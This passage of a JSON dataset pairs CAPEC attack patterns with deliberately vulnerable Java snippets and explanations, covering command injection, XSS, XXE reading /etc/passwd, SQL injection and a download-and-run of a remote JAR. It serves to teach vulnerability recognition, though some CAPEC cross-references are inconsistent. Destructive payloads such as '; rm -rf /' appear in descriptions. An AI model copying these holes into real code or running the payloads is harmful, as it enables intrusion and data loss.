        "description": "This Java servlet code demonstrates a resource injection vulnerability. The code takes a 'file' parameter from the HTTP request without proper validation and uses it to construct a file path. This can be exploited by an attacker to access unintended files on the server. The code does not validate the file name, allowing for potential directory traversal attacks (CWE-99). It also does not check if the file name contains unsafe characters or patterns (CWE-1289), nor does it validate the file path properly (CWE-20). This example highlights the importance of proper input validation to prevent unauthorized access to resources."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter a class name to load:\");\n        String className = scanner.nextLine();\n\n        try {\n            // CWE-470: Use of Dynamic Class Loading\n            Class<?> cls = Class.forName(className);\n            System.out.println(\"Class \" + className + \" loaded successfully.\");\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n\n        System.out.println(\"Enter a command to execute:\");\n        String command = scanner.nextLine();\n\n        try {\n            // CWE-77: Command Injection\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates vulnerabilities related to code injection and the use of dynamic class loading. The code takes user input to dynamically load a class (CWE-470) and execute a system command (CWE-77). This is highly insecure as it allows an attacker to inject malicious code or commands, leading to potential system compromise. The code represents the deprecated CAPEC-242 (Code Injection) by showing how user input can be exploited to execute arbitrary code."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class CodeInjectionExample extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // Vulnerable code: directly using user input in script execution\n        String script = \"print('User input: \" + userInput + \"')\";\n        \n        // Execute the script (hypothetical execution method)\n        executeScript(script);\n    }\n\n    private void executeScript(String script) {\n        // Hypothetical method to execute the script\n        System.out.println(\"Executing script: \" + script);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a code injection vulnerability. The `doPost` method retrieves user input from an HTTP request parameter and directly incorporates it into a script string without proper validation or sanitization. This script is then hypothetically executed by the `executeScript` method. The vulnerability arises because an attacker could inject malicious code into the `userInput` parameter, which would then be executed by the application. This example embodies the main idea of CAPEC-242 (Code Injection) and is related to CWE-94 (Improper Control of Generation of Code), CWE-506 (Embedded Malicious Code), CWE-74 (Improper Neutralization of Special Elements in Output), CWE-1173 (Improper Use of Validation Framework), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<a href='#' style='color:red;' onmouseover='\" + userInput + \"'>Hover over me!</a>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) by improperly neutralizing user input in an HTML attribute. The servlet takes a 'userInput' parameter from the HTTP request and directly inserts it into the 'onmouseover' attribute of an anchor tag without proper sanitization. This allows an attacker to inject malicious JavaScript code, which will be executed when a user hovers over the link. This example embodies the main idea of CAPEC-138 (XSS Targeting HTML Attributes) and is related to several CWEs, including CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"url\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<a href='\" + userInput + \"'>Click here</a>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to 'XSS Targeting URI Placeholders'. The servlet takes a 'url' parameter from the HTTP request and directly embeds it into an anchor tag's href attribute without proper sanitization or validation. This can be exploited by an attacker to inject a malicious URI, such as 'javascript:alert(1)', which would execute arbitrary JavaScript when the link is clicked. This example embodies CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        \n        // Vulnerable to XSS using doubled characters\n        if (userInput != null && userInput.contains(\"<<script>\")) {\n            response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n        } else {\n            response.getWriter().println(\"<html><body>No script detected.</body></html>\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) using doubled characters. The servlet reads a parameter 'input' from the HTTP request. It then checks if the input contains the string '<<script>', which is a doubled character sequence intended to bypass basic input validation filters. If the condition is met, the input is directly included in the HTML response without proper sanitization, leading to a potential XSS attack. This code snippet embodies the main idea of CAPEC-85 and related CWEs by showing how improper input validation and neutralization can be exploited using doubled characters."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String sanitizedInput = userInput.replaceAll(\"<script>\", \"\"); // Incomplete denylist\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<img src='\" + sanitizedInput + \"'>\"); // Improper neutralization in IMG tag\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the deprecated CAPEC for XSS using Flash, now covered by CAPEC-174 and CAPEC-591. The code takes user input from an HTTP GET request and attempts to sanitize it using an incomplete denylist (CWE-692). The sanitized input is then used directly in an IMG tag's src attribute without proper neutralization (CWE-82). This can lead to XSS attacks if an attacker provides a malicious input that bypasses the simple denylist, such as using alternate script syntax (CWE-87) or doubled characters (CWE-85). The code snippet highlights the risks of using inadequate input sanitization methods and the importance of comprehensive input validation and output encoding."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        \n        // Improper neutralization of invalid characters\n        if (userInput != null && userInput.contains(\"\\0\")) {\n            userInput = userInput.split(\"\\0\")[0];\n        }\n        \n        // Improper neutralization of script-related HTML tags\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where an adversary can insert invalid characters to bypass input filtering, leading to a potential XSS attack. The code retrieves a user input parameter and attempts to filter out null characters (\\0). However, it only removes the part of the input after the null character, allowing any malicious script before the null character to pass through. The user input is then directly included in the HTML response without proper sanitization, making the application susceptible to XSS attacks. This snippet embodies the main idea of CAPEC-86 and related CWEs by showing improper neutralization of invalid characters and script-related HTML tags."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CommandInjectionExample <command>\");\n            return;\n        }\n\n        String userInput = args[0];\n        try {\n            // Vulnerable code: directly using user input in a command\n            String command = \"ls \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The program takes a single command-line argument from the user and appends it to an 'ls' command, which is then executed using Runtime.getRuntime().exec(). This approach is dangerous because it allows an attacker to inject arbitrary commands. For example, if the user input is '&& rm -rf /', the resulting command would be 'ls && rm -rf /', which could delete critical files. This code embodies the main idea of CAPEC-88 (Argument Injection) and CAPEC-77 (Command Injection) by improperly neutralizing special elements in the command string, leading to potential exploitation."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class TerminalInjectionExample {\n    public static void main(String[] args) {\n        try {\n            // Simulate user input\n            String userInput = args[0];\n\n            // Vulnerable code: directly using user input in a command\n            String command = \"ls \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n\n            // Read the output of the command\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Improper Neutralization of Special Elements used in a Command' (CWE-77) and 'Improper Neutralization of Special Elements used in an OS Command' (CWE-78). The code takes user input from the command line arguments and directly uses it to construct an OS command (`ls`). This can lead to command injection if the user input contains special characters or malicious commands. For example, if the user input is `; rm -rf /`, it could delete important files. This snippet embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how untrusted input can be used to manipulate terminal commands, leading to potential security risks."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import javax.xml.xpath.*;\nimport org.xml.sax.InputSource;\nimport java.io.StringReader;\n\npublic class XMLInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' or '1'='1\"; // Simulated malicious input\n        String xmlData = \"<users><user><id>1</id><name>John</name></user></users>\";\n\n        try {\n            XPathFactory xPathFactory = XPathFactory.newInstance();\n            XPath xPath = xPathFactory.newXPath();\n            String expression = \"/users/user[id/text()=\" + userInput + \"]/name/text()\";\n\n            InputSource inputSource = new InputSource(new StringReader(xmlData));\n            String result = xPath.evaluate(expression, inputSource);\n\n            System.out.println(\"Result: \" + result);\n        } catch (XPathExpressionException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an XML Injection vulnerability. The code constructs an XPath expression using unvalidated user input, which can be exploited by an attacker to manipulate the query. In this example, the user input is a malicious string designed to bypass the intended query logic, similar to an SQL injection attack. The code does not properly neutralize special elements in the user input, leading to potential unauthorized data access. This snippet embodies the main idea of CAPEC-91 (XML Injection) and related CWEs, highlighting the risks of improper input validation and neutralization in XML processing."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class LocalCodeInclusion {\n    private static String configFilePath = \"config.properties\";\n    private static Properties properties = new Properties();\n\n    public static void main(String[] args) {\n        try {\n            loadConfig();\n            String filePath = properties.getProperty(\"filePath\");\n            executeFile(filePath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void loadConfig() throws IOException {\n        FileInputStream fis = new FileInputStream(configFilePath);\n        properties.load(fis);\n        fis.close();\n    }\n\n    private static void executeFile(String filePath) {\n        try {\n            File file = new File(filePath);\n            if (file.exists()) {\n                BufferedReader br = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    System.out.println(line);\n                }\n                br.close();\n            } else {\n                System.out.println(\"File not found: \" + filePath);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Local Code Inclusion vulnerability. The application loads a configuration file ('config.properties') that specifies the path to another file. The 'executeFile' method then reads and prints the contents of the specified file. This code is vulnerable because it allows an attacker to control the 'filePath' property in the configuration file, potentially leading to the inclusion and execution of arbitrary local files. This embodies CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as the file path is controlled externally. Additionally, the code does not properly restrict the reading of dynamically-managed code resources (CWE-913), and it relies on global variables (CWE-1108) for configuration management."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class LocalFileInclusionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        if (filePath != null) {\n            File file = new File(filePath);\n            if (file.exists() && file.isFile()) {\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n                reader.close();\n            } else {\n                response.getWriter().println(\"File not found or is not a file.\");\n            }\n        } else {\n            response.getWriter().println(\"No file specified.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a Local File Inclusion (LFI) vulnerability. The servlet reads a file specified by a 'file' parameter in the HTTP request and includes its contents in the HTTP response. The code does not properly validate or sanitize the 'file' parameter, allowing an attacker to specify any file path on the server. This can lead to the inclusion and execution of arbitrary files, potentially exposing sensitive information or enabling further attacks. The code snippet embodies the main idea of CAPEC-829 and related CWEs by showing how improper control and validation of file paths can lead to security vulnerabilities."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class RemoteCodeInclusion {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            URLConnection connection = url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"malicious.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n            inputStream.close();\n            outputStream.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Remote Code Inclusion vulnerability. The code downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). After downloading, it executes the JAR file, which could contain malicious code (CWE-829). This represents the main idea of the CAPEC, where an attacker can force an application to load and execute arbitrary code from a remote location, potentially compromising the application's security."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class DTDInjectionExample {\n    public static void main(String[] args) {\n        String xml = \"<?xml version=\\\"1.0\\\"?>\" +\n                     \"<!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]>\" +\n                     \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xml)));\n            System.out.println(doc.getDocumentElement().getTextContent());\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DTD Injection vulnerability. The code parses an XML string that includes a Document Type Definition (DTD) with an external entity reference. The external entity references a local file ('/etc/passwd'), which is a common target for attackers to read sensitive information. The DocumentBuilderFactory is configured to allow DTD declarations and external entities, which makes the application vulnerable to DTD Injection attacks. This example highlights the CWE-827 (Improper Control of Document Type Definition) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs) weaknesses by not restricting the DTD and allowing external entity references."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import javax.xml.soap.*;\n\npublic class SOAPArrayOverflowExample {\n    public static void main(String[] args) throws Exception {\n        // Create a SOAP message\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage soapMessage = messageFactory.createMessage();\n        SOAPPart soapPart = soapMessage.getSOAPPart();\n        SOAPEnvelope envelope = soapPart.getEnvelope();\n        SOAPBody body = envelope.getBody();\n\n        // Create a SOAP array with a specified length\n        SOAPElement arrayElement = body.addChildElement(\"Array\");\n        arrayElement.addAttribute(envelope.createName(\"length\"), \"2\");\n\n        // Add more elements than specified in the length attribute\n        arrayElement.addChildElement(\"item\").addTextNode(\"Item 1\");\n        arrayElement.addChildElement(\"item\").addTextNode(\"Item 2\");\n        arrayElement.addChildElement(\"item\").addTextNode(\"Item 3\");\n\n        // Process the SOAP message\n        processSOAPMessage(soapMessage);\n    }\n\n    public static void processSOAPMessage(SOAPMessage soapMessage) throws Exception {\n        SOAPBody body = soapMessage.getSOAPBody();\n        SOAPElement arrayElement = (SOAPElement) body.getChildElements().next();\n        int length = Integer.parseInt(arrayElement.getAttribute(\"length\"));\n\n        // Allocate buffer based on the specified length\n        String[] items = new String[length];\n\n        // Read elements into the buffer without checking actual number of elements\n        int i = 0;\n        for (Iterator<?> it = arrayElement.getChildElements(); it.hasNext(); i++) {\n            SOAPElement item = (SOAPElement) it.next();\n            items[i] = item.getValue(); // Potential buffer overflow\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP Array Overflow vulnerability. The main idea is that an attacker can send a SOAP request with an array whose actual length exceeds the length indicated in the request. The server naively trusts the specified length and allocates a buffer based on this length. When processing the array, the server reads more elements than the allocated buffer can hold, leading to a potential buffer overflow. This example embodies the CAPEC description and related CWEs by showing how improper handling of length parameters and buffer allocation can lead to security vulnerabilities."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class TransactionLogger {\n    private Map<String, String> transactions = new HashMap<>();\n    private static final String LOG_FILE = \"transaction.log\";\n\n    public void addTransaction(String transactionId, String data) {\n        transactions.put(transactionId, data);\n        logTransaction(transactionId, data);\n    }\n\n    private void logTransaction(String transactionId, String data) {\n        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {\n            writer.write(\"Transaction ID: \" + transactionId + \", Data: \" + data + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        TransactionLogger logger = new TransactionLogger();\n        logger.addTransaction(\"12345\", \"SensitiveData\");\n    }\n}",
        "description": "This Java code snippet represents a vulnerable implementation of a transaction logging system. The `TransactionLogger` class stores transaction data in a `HashMap` and logs each transaction to a file named `transaction.log`. The `logTransaction` method writes transaction details, including potentially sensitive data, directly to the log file without any encryption or access control. This embodies the deprecated CAPEC 'Abuse of Transaction Data Structure' by demonstrating how transaction data can be improperly handled and exposed. The related CWEs provide context for the vulnerabilities: CWE-532 (Information Exposure Through Log Files) and CWE-287 (Authentication Bypass Issues) highlight the risks of exposing sensitive information and the lack of proper authentication mechanisms."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableUpdateClient {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"example.com\", 8080);\n        InputStream in = socket.getInputStream();\n        FileOutputStream fileOut = new FileOutputStream(\"update.zip\");\n\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            fileOut.write(buffer, 0, bytesRead);\n        }\n\n        fileOut.close();\n        in.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet represents a vulnerable client application that passively receives an update from a server without any form of authentication or encryption. The client connects to a server at 'example.com' on port 8080 and downloads an update file ('update.zip') directly. This embodies the main idea of the deprecated CAPEC-65, which involves sniffing and capturing application code during a dynamic update. The code is vulnerable to several issues highlighted by the related CWEs:\n\n1. **CWE-294: Authentication Bypass by Capture-replay** - The lack of authentication allows an attacker to capture the update and replay it to the client.\n2. **CWE-603: Use of Client-Side Authentication** - The code does not perform any server-side authentication, making it susceptible to modified clients bypassing any potential client-side checks.\n3. **CWE-589: Call to Non-ubiquitous API** - Although not directly shown in this snippet, using platform-specific APIs without checks can lead to inconsistencies and potential vulnerabilities.\n\nOverall, this code demonstrates how a lack of proper security measures can lead to vulnerabilities during the update process."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket clientSocket) {\n        this.clientSocket = clientSocket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\"); // CWE-603: Client-side authentication\n            }\n\n            // Simulate sending application code\n            out.println(\"Here is the application code\");\n\n            in.close();\n            out.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. When a client connects, it spawns a new thread to handle the client. The server performs a simple client-side authentication check by reading a message from the client and responding with 'AUTH_SUCCESS' if the message is 'AUTHENTICATE'. This is an example of CWE-603: Use of Client-Side Authentication, which can be bypassed by a modified client. Additionally, the server sends application code to the client, which can be sniffed and captured by an attacker, embodying the main idea of the deprecated CAPEC pattern 'Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching'."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\"); // CWE-603: Client-side authentication\n            }\n\n            // Simulate sending application code\n            out.println(\"Here is the application code\");\n\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. When a client connects, it spawns a new thread to handle the client. The server performs a simple client-side authentication check by reading a message from the client and responding with 'AUTH_SUCCESS' if the message is 'AUTHENTICATE'. This is an example of CWE-603: Use of Client-Side Authentication, which can be bypassed by a modified client. Additionally, the server sends application code to the client without proper security measures, making it susceptible to CAPEC-65: Sniff Application Code. An attacker could sniff the network traffic to capture the application code during its initial distribution."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableFuzzingExample {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\") + \", Password: \" + resultSet.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SQL Injection vulnerability, which is a common example of improper input validation (CWE-20) and improper neutralization of special elements in SQL commands (CWE-89). The code constructs an SQL query using user input without proper sanitization, allowing an attacker to manipulate the query logic. The simulated malicious input (' OR '1'='1) is designed to always return true, potentially exposing sensitive user data (CWE-202). Additionally, if an error occurs, the stack trace might reveal sensitive information about the database structure (CWE-209). This snippet embodies the main idea of the CAPEC by showing how an adversary can send modified queries to extract sensitive information beyond what is intended."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import java.io.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class VulnerableFileProcessor {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableFileProcessor <file_path>\");\n            return;\n        }\n\n        String filePath = args[0];\n        try {\n            // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n            if (!filePath.endsWith(\".txt\")) {\n                System.out.println(\"Invalid file type. Only .txt files are allowed.\");\n                return;\n            }\n\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            File file = new File(filePath);\n            if (!file.exists()) {\n                System.out.println(\"File does not exist.\");\n                return;\n            }\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            String content = new String(Files.readAllBytes(Paths.get(filePath)));\n            System.out.println(\"File content: \" + content);\n\n            // Simulate processing the file content\n            processFileContent(content);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processFileContent(String content) {\n        // Simulate processing that could be vulnerable to corrupted file content\n        if (content.contains(\"<malicious>\") || content.length() > 1000) {\n            System.out.println(\"Error: File content is corrupted or too large.\");\n            return;\n        }\n        System.out.println(\"Processing file content...\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file processing application. The application takes a file path as an argument and processes the file if it has a .txt extension. The code embodies the main idea of the CAPEC 'Force Use of Corrupted Files' by showing how an attacker could exploit the application to process a corrupted file. The code also highlights several related CWEs: CWE-646 (reliance on file extension), CWE-434 (unrestricted upload of dangerous file types), and CWE-829 (inclusion of functionality from an untrusted control sphere). The application reads the file content and processes it without proper validation, making it susceptible to attacks involving corrupted files."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import java.io.IOException;\n\npublic class VulnerableCode {\n    // CWE-1108: Excessive Reliance on Global Variables\n    public static String ENV_VAR = System.getenv(\"USER_INPUT\");\n\n    public static void main(String[] args) throws IOException {\n        // CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n        eval(ENV_VAR);\n    }\n\n    public static void eval(String input) throws IOException {\n        // CWE-1106: Insufficient Use of Symbolic Constants\n        String command = \"cmd /c \" + input;\n        Runtime.getRuntime().exec(command);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable pattern related to environment variable manipulation and several related CWEs. The code retrieves an environment variable 'USER_INPUT' and uses it directly in a command execution context without proper validation or neutralization, leading to potential command injection (CWE-95). The use of a global variable (CWE-1108) for storing the environment variable and the lack of symbolic constants (CWE-1106) further exacerbate the security risks. This snippet highlights the dangers of improper handling of environment variables and the importance of secure coding practices."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "public class VulnerableCode {\n    // Global variable\n    public static String userInput;\n\n    public static void main(String[] args) {\n        // Simulate user input\n        userInput = \"admin\";\n        processInput();\n    }\n\n    public static void processInput() {\n        // Dynamic variable evaluation\n        String dynamicVarName = \"user\" + userInput;\n        String value = getDynamicValue(dynamicVarName);\n        System.out.println(\"Value: \" + value);\n    }\n\n    public static String getDynamicValue(String varName) {\n        // Improper control of dynamically-identified variables\n        if (varName.equals(\"useradmin\")) {\n            return \"Sensitive Data\";\n        }\n        return \"Default Data\";\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to global variable manipulation and improper control of dynamically-identified variables. The global variable 'userInput' is used to store user input, which is then used to dynamically construct a variable name in the 'processInput' method. This dynamic evaluation can lead to security issues, as shown in the 'getDynamicValue' method, where sensitive data is returned based on the dynamically constructed variable name. This code embodies the main idea of CAPEC-77 and related CWEs, highlighting the risks of excessive reliance on global variables, improper control of dynamically-identified variables, and dynamic variable evaluation."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
